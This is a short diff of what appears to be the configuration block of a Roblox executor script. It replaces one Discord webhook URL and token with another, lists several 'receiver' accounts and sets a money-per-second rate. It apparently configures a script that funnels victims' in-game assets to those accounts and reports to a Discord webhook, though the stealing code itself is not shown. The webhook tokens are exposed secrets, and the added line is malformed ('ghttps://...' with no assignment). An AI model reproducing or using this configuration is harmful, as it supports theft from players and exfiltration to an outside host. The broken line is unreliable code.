@@ -1,4 +1,4 @@
-getgenv().WEBHOOK = "https://canary.discord.com/api/webhooks/1434458856175697981/EX_JhWHixcHSaxTK1zB6SchLjI8uKXfs5BO1kvGfrzrtCdCaUGRKuVbI5xxhl90R5x1G"
+ghttps://discord.com/api/webhooks/1434459133385642036/2iVZ8vn95VhXBdn8FOfeN4xuh73Mn2gB2mG767deRwldyH0MViPSTMvXAxPJqbgAALAK"
 getgenv().RECEIVERS = {"devrepay", "GAGRICHKID_0", "wextonstorage1", "Wextonstorage2",
 "wextonstorage3", "xavierstorage1", "sabstorage0066", "leiimi_11"}
 getgenv().MONEY_PER_SECOND = 500000 -- DEFAULT: 100000/s
